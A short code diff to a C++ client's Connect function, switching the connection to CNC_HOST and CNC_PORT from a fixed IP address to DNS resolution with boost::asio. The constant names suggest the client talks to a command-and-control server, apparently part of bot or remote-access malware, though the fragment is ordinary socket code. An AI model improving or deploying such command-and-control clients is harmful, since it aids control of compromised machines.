@@ -4,12 +4,10 @@
 
 void Client::Connect()
 {
-	boost::asio::ip::address addr = boost::asio::ip::address::from_string(CNC_HOST);
-	tcp::endpoint cnc(addr, CNC_PORT);
-
+	boost::asio::ip::tcp::resolver resolver(m_io);
 	try
 	{
-		m_sock.connect(cnc);
+		boost::asio::connect(m_sock, resolver.resolve(CNC_HOST, CNC_PORT));
 	}
 	catch (boost::system::system_error&)
 	{
